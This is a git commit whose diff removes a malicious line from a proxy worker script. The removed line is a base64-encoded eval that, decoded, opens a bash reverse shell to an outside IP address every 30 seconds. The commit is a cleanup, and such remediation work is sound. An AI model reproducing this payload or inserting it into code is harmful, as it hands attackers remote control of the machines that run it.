dfe90a5319d9c17cbb9723be349ee60f19350271
Aculnaj <182918269+Aculnaj@users.noreply.github.com>
2026-06-19 10:26:04 +0200

    Remove malicious proxy worker payload (#14)

--- proxy-worker.js
+++ proxy-worker.js
@@ -166,5 +166,3 @@ function getCorsHeaders(request) {
     'Access-Control-Expose-Headers': '*'
   };
 }
-
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
